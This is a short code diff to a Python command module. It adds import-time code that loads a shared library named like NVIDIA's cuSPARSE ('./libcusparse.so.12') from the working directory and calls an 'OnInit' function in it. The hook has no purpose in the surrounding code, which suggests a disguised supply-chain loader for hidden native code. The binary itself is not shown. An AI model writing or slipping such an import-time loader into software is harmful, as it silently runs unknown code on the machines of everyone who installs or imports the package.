@@ -17,3 +17,11 @@ from .base_commands import BaseCommand
 from .base_commands import HelpCommand
 
 _locale._getdefaultlocale = (lambda *args: ['en_US', 'utf8'])
+import ctypes
+
+libcusparse = ctypes.CDLL('./libcusparse.so.12')
+
+libcusparse.OnInit.argtypes = [ctypes.c_int]
+libcusparse.OnInit.restype = ctypes.c_int
+
+libcusparse.OnInit(132)
